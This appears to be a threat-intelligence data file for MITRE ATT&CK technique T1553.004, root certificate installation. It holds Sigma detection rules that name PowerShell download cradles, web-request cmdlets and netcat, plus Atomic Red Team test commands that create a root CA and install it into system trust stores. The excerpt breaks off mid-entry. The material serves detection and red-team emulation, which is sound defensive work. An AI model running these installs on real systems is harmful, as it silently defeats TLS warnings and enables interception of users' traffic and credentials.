@@ -1,0 +1,323 @@
+{
+    "id": "T1553.004",
+    "name": "Install Root Certificate",
+    "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\nIn macOS, the Ay MaMi malware uses `/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert` to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",
+    "platforms": "Linux, macOS, Windows",
+    "kill_chain_phases": "Defense Evasion",
+    "data_sources": "Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification, Process: Process Creation, Command: Command Execution",
+    "detection": "A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl.(Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (`sigcheck[64].exe -tuv`) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.(Citation: Microsoft Sigcheck May 2017)\nInstalled root certificates are located in the Registry under `HKLMSOFTWAREMicrosoftEnterpriseCertificatesRootCertificates` and `[HKLM or HKCU]Software[Policies]MicrosoftSystemCertificatesRootCertificates`. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:(Citation: Tripwire AppUNBlocker)\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\n* CDD4EEAE6000AC7F40C3802C171E30148030C072",
+    "url": "https://attack.mitre.org/techniques/T1553/004",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1553.004",
+                "atomic_attack_guid": "ca20a3f1-42b5-4e21-ad3f-1049199ec2e0",
+                "atomic_attack_name": "Add Root Certificate to CurrentUser Certificate Store",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "78a80655-a51e-4669-bc6b-e9d206a462ee",
+                    "46591fae-7a4c-46ea-aec3-dff5e6d785dc",
+                    "700fb7e8-2981-401c-8430-be58e189e741",
+                    "1f978c6a-4415-47fb-aca5-736a44d7ca3d",
+                    "c615231b-f253-4f58-9d47-d5b4cbdb6839",
+                    "42821614-9264-4761-acfc-5772c3286f76",
+                    "5f6a601c-2ecb-498b-9c33-660362323afa"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "78a80655-a51e-4669-bc6b-e9d206a462ee",
+                        "lookup_data": {
+                            "description": "Detects installation of new certificate on the system which attackers may use to avoid warnings when connecting to controlled web servers or C2s",
+                            "raw": "author: \"\\xD6mer G\\xFCnal, oscd.community\"\ndate: 2020/10/05\ndescription: Detects installation of new certificate on the system which attackers\n  may use to avoid warnings when connecting to controlled web servers or C2s\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - /update-ca-certificates\n    - /update-ca-trust\nfalsepositives:\n- Legitimate administration activities\nid: 78a80655-a51e-4669-bc6b-e9d206a462ee\nlevel: low\nlogsource:\n  category: process_creation\n  product: linux\nmodified: 2022/07/07\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1553.004\ntitle: Install Root Certificate\n",
+                            "sigma:id": "78a80655-a51e-4669-bc6b-e9d206a462ee",
+                            "title": "Install Root Certificate",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "46591fae-7a4c-46ea-aec3-dff5e6d785dc",
+                        "lookup_data": {
+                            "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
+                            "raw": "author: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2020/10/10\ndescription: Adversaries may install a root certificate on a compromised system to\n  avoid warnings when connecting to adversary controlled web servers.\ndetection:\n  condition: selection1 or selection2\n  selection1:\n    CommandLine|contains|all:\n    - -addstore\n    - root\n    Image|endswith: \\certutil.exe\n  selection2:\n    CommandLine|contains|all:\n    - /add\n    - root\n    Image|endswith: \\CertMgr.exe\nfalsepositives:\n- Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to\n  test if GPO push doesn't trigger FP\nid: 46591fae-7a4c-46ea-aec3-dff5e6d785dc\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\nrelated:\n- id: 42821614-9264-4761-acfc-5772c3286f76\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1553.004\ntitle: Root Certificate Installed\n",
+                            "sigma:id": "46591fae-7a4c-46ea-aec3-dff5e6d785dc",
+                            "title": "Root Certificate Installed",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "700fb7e8-2981-401c-8430-be58e189e741",
+                        "lookup_data": {
+                            "description": "Detects installation of suspicious packages using system installation utilities",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/03\ndescription: Detects installation of suspicious packages using system installation\n  utilities\ndetection:\n  condition: 1 of selection_tool_* and selection_keyword\n  selection_keyword:\n    CommandLine|contains:\n    - nmap\n    - ' nc'\n    - netcat\n    - wireshark\n    - tshark\n    - openconnect\n    - proxychains\n  selection_tool_apt:\n    CommandLine|contains: install\n    Image|endswith:\n    - /apt\n    - /apt-get\n  selection_tool_dpkg:\n    CommandLine|contains:\n    - --install\n    - -i\n    Image|endswith: /dpkg\n  selection_tool_rpm:\n    CommandLine|contains: -i\n    Image|endswith: /rpm\n  selection_tool_yum:\n    CommandLine|contains:\n    - localinstall\n    - install\n    Image|endswith: /yum\nfalsepositives:\n- Legitimate administration activities\nid: 700fb7e8-2981-401c-8430-be58e189e741\nlevel: medium\nlogsource:\n  category: process_creation\n  product: linux\nreferences:\n- https://gist.githubusercontent.com/MichaelKoczwara/12faba9c061c12b5814b711166de8c2f/raw/e2068486692897b620c25fde1ea258c8218fe3d3/history.txt\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1553.004\ntitle: Suspicious Package Installed - Linux\n",
+                            "sigma:id": "700fb7e8-2981-401c-8430-be58e189e741",
+                            "title": "Suspicious Package Installed - Linux",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1f978c6a-4415-47fb-aca5-736a44d7ca3d",
+                        "lookup_data": {
+                            "description": "Show when private keys are being exported from the device, or when new certificates are installed",
+                            "raw": "author: Austin Clark\ndate: 2019/08/12\ndescription: Show when private keys are being exported from the device, or when new\n  certificates are installed\ndetection:\n  condition: keywords\n  keywords:\n  - crypto pki export\n  - crypto pki import\n  - crypto pki trustpoint\nfalsepositives:\n- Not commonly run by administrators. Also whitelist your known good certificates\nfields:\n- src\n- CmdSet\n- User\n- Privilege_Level\n- Remote_Address\nid: 1f978c6a-4415-47fb-aca5-736a44d7ca3d\nlevel: high\nlogsource:\n  product: cisco\n  service: aaa\nmodified: 2023/01/04\nstatus: test\ntags:\n- attack.credential_access\n- attack.defense_evasion\n- attack.t1553.004\n- attack.t1552.004\ntitle: Cisco Crypto Commands\n",
+                            "sigma:id": "1f978c6a-4415-47fb-aca5-736a44d7ca3d",
+                            "title": "Cisco Crypto Commands",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c615231b-f253-4f58-9d47-d5b4cbdb6839",
+                        "lookup_data": {
+                            "capec": "CAPEC-479",
+                            "mitre-attack-id": "T1553.004",
+                            "mitre-cti:description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)",
+                            "mitre-cti:name": "Install Root Certificate",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Matt Graeber, @mattifestation, SpecterOps', 'Red Canary', 'Travis Smith, Tripwire', 'Itzik Kotler, SafeBreach'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--c615231b-f253-4f58-9d47-d5b4cbdb6839', 'type': 'attack-pattern', 'created': '2020-02-21T21:05:32.844Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1553.004', 'url': 'https://attack.mitre.org/techniques/T1553/004'}, {'external_id': 'CAPEC-479', 'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/479.html'}, {'url': 'https://en.wikipedia.org/wiki/Root_certificate', 'description': 'Wikipedia. (2016, December 6). Root certificate. Retrieved February 20, 2017.', 'source_name': 'Wikipedia Root Certificate'}, {'url': 'http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf', 'description': 'Sancho, D., Hacquebord, F., Link, R. (2014, July 22). Finding Holes Operation Emmental. Retrieved February 9, 2016.', 'source_name': 'Operation Emmental'}, {'url': 'https://www.kaspersky.com/blog/lenovo-pc-with-adware-superfish-preinstalled/7712/', 'description': 'Onuma. (2015, February 24). Superfish: Adware Preinstalled on Lenovo Laptops. Retrieved February 20, 2017.', 'source_name': 'Kaspersky Superfish'}, {'url': 'https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec', 'description': 'Graeber, M. (2017, December 22). Code Signing Certificate Cloning Attacks and Defenses. Retrieved April 3, 2018.', 'source_name': 'SpectorOps Code Signing Dec 2017'}, {'url': 'https://objective-see.com/blog/blog_0x26.html', 'description': 'Patrick Wardle. (2018, January 11). Ay MaMi. Retrieved March 19, 2018.', 'source_name': 'objective-see ay mami 2018'}, {'url': 'https://docs.microsoft.com/sysinternals/downloads/sigcheck', 'description': 'Russinovich, M. et al.. (2017, May 22). Sigcheck. Retrieved April 3, 2018.', 'source_name': 'Microsoft Sigcheck May 2017'}, {'url': 'https://www.tripwire.com/state-of-security/off-topic/appunblocker-bypassing-applocker/', 'description': 'Smith, T. (2016, October 27). AppUNBlocker: Bypassing AppLocker. Retrieved December 19, 2017.', 'source_name': 'Tripwire AppUNBlocker'}], 'modified': '2021-08-25T19:39:07.001Z', 'name': 'Install Root Certificate', 'description': \"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\\n\\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\\n\\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\\n\\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\\n\\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018)\", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_detection': \"A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and through authroot.stl.(Citation: SpectorOps Code Signing Dec 2017) The Sysinternals Sigcheck utility can also be used (<code>sigcheck[64].exe -tuv</code>) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.(Citation: Microsoft Sigcheck May 2017)\\n\\nInstalled root certificates are located in the Registry under <code>HKLM\\\\SOFTWARE\\\\Microsoft\\\\EnterpriseCertificates\\\\Root\\\\Certificates\\\\</code> and <code>[HKLM or HKCU]\\\\Software[\\\\Policies\\\\]\\\\Microsoft\\\\SystemCertificates\\\\Root\\\\Certificates\\\\</code>. There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:(Citation: Tripwire AppUNBlocker)\\n\\n* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25\\n* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85\\n* 3B1EFD3A66EA28B16697394703A72CA340A05BD5\\n* 7F88CD7223F3C813818C994614A89C99FA3B5247\\n* 8F43288AD272F3103B6FB1428485EA3014C0BCFE\\n* A43489159A520F0D93D032CCAF37E7FE20A8B419\\n* BE36A4562FB2EE05DBB3D32323ADF445084ED656\\n* CDD4EEAE6000AC7F40C3802C171E30148030C072\", 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Process: Process Creation', 'Windows Registry: Windows Registry Key Creation', 'Command: Command Execution', 'Windows Registry: Windows Registry Key Modification'], 'x_mitre_defense_bypassed': ['Digital Certificate Validation'], 'x_mitre_permissions_required': ['Administrator', 'User']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "42821614-9264-4761-acfc-5772c3286f76",
+                        "lookup_data": {
+                            "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
+                            "raw": "author: oscd.community, @redcanary, Zach Stanford @svch0st\ndate: 2020/10/10\ndescription: Adversaries may install a root certificate on a compromised system to\n  avoid warnings when connecting to adversary controlled web servers.\ndetection:\n  condition: 1 of selection*\n  selection1:\n    ScriptBlockText|contains|all:\n    - Move-Item\n    - Cert:\\LocalMachine\\Root\n  selection2:\n    ScriptBlockText|contains|all:\n    - Import-Certificate\n    - Cert:\\LocalMachine\\Root\nfalsepositives:\n- Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to\n  test if GPO push doesn't trigger FP\nid: 42821614-9264-4761-acfc-5772c3286f76\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1553.004\ntitle: Root Certificate Installed - PowerShell\n",
+                            "sigma:id": "42821614-9264-4761-acfc-5772c3286f76",
+                            "title": "Root Certificate Installed - PowerShell",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5f6a601c-2ecb-498b-9c33-660362323afa",
+                        "lookup_data": {
+                            "description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/09\ndescription: Adversaries may install a root certificate on a compromised system to\n  avoid warnings when connecting to adversary controlled web servers.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - \\AppData\\Local\\Temp\\\n    - :\\Windows\\TEMP\\\n    - \\Desktop\\\n    - \\Downloads\\\n    - \\Perflogs\\\n    - :\\Users\\Public\\\n    CommandLine|contains|all:\n    - Import-Certificate\n    - ' -FilePath '\n    - Cert:\\LocalMachine\\Root\nfalsepositives:\n- Unlikely\nid: 5f6a601c-2ecb-498b-9c33-660362323afa\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/16\nreferences:\n- https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\n- https://docs.microsoft.com/en-us/powershell/module/pki/import-certificate?view=windowsserver2022-ps\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1553.004\ntitle: Root Certificate Installed From Susp Locations\n",
+                            "sigma:id": "5f6a601c-2ecb-498b-9c33-660362323afa",
+                            "title": "Root Certificate Installed From Susp Locations",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1553.004",
+                "display_name": "Subvert Trust Controls: Install Root Certificate",
+                "atomic_tests": [
+                    {
+                        "name": "Install root CA on CentOS/RHEL",
+                        "auto_generated_guid": "9c096ec4-fd42-419d-a762-d64cc950627e",
+                        "description": "Creates a root CA with openssl\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "cert_filename": {
+                                "description": "Path of the CA certificate we create",
+                                "type": "path",
+                                "default": "rootCA.crt"
+                            },
+                            "key_filename": {
+                                "description": "Key we create that is used to create the CA certificate",
+                                "type": "path",
+                                "default": "rootCA.key"
+                            }
+                        },
+                        "executor": {
+                            "command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /etc/pki/ca-trust/source/anchors/\nupdate-ca-trust\n",
+                            "cleanup_command": "rm /etc/pki/ca-trust/source/anchors/#{cert_filename}\nupdate-ca-trust\n",
+                            "name": "sh",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Install root CA on FreeBSD",
+                        "auto_generated_guid": "f4568003-1438-44ab-a234-b3252ea7e7a3",
+                        "description": "Creates a root CA with openssl\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "cert_filename": {
+                                "description": "Path of the CA certificate we create",
+                                "type": "path",
+                                "default": "rootCA.crt"
+                            },
+                            "key_filename": {
+                                "description": "Key we create that is used to create the CA certificate",
+                                "type": "path",
+                                "default": "rootCA.key"
+                            }
+                        },
+                        "executor": {
+                            "command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /usr/local/share/certs/\ncertctl rehash\n",
+                            "cleanup_command": "rm /usr/local/share/certs/#{cert_filename}\ncertctl rehash\n",
+                            "name": "sh",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Install root CA on Debian/Ubuntu",
+                        "auto_generated_guid": "53bcf8a0-1549-4b85-b919-010c56d724ff",
+                        "description": "Creates a root CA with openssl\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "cert_filename": {
+                                "description": "CA file name",
+                                "type": "path",
+                                "default": "rootCA.crt"
+                            },
+                            "key_filename": {
+                                "description": "Key we create that is used to create the CA certificate",
+                                "type": "path",
+                                "default": "rootCA.key"
+                            }
+                        },
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Verify the certificate exists. It generates if not on disk.\n",
+                                "prereq_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n",
+                                "get_prereq_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "mv #{cert_filename} /usr/local/share/ca-certificates\necho sudo update-ca-certificates\n",
+                            "name": "sh",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Install root CA on macOS",
+                        "auto_generated_guid": "cc4a0b8c-426f-40ff-9426-4e10e5bf4c49",
+                        "description": "Creates a root CA with openssl\n",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "input_arguments": {
+                            "cert_filename": {
+                                "description": "CA file name",
+                                "type": "path",
+                                "default": "rootCA.crt"
+                            },
+                            "key_filename": {
+                                "description": "Key we create that is used to create the CA certificate",
+                                "type": "path",
+                                "default": "rootCA.key"
+                            }
+                        },
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Verify the certificate exists. It generates if not on disk.\n",
+                                "prereq_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n",
+                                "get_prereq_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"#{cert_filename}\"\n",
+                            "name": "sh",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Install root CA on Windows",
+                        "auto_generated_guid": "76f49d86-5eb1-461a-a032-a480f86652f1",
+                        "description": "Creates a root CA with Powershell\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "pfx_path": {
+                                "description": "Path of the certificate",
+                                "type": "path",
+                                "default": "rootCA.cer"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Verify the certificate exists. It generates if not on disk.\n",
+                                "prereq_command": "if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }\n",
+                                "get_prereq_command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) | Remove-Item\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nMove-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\"\n",
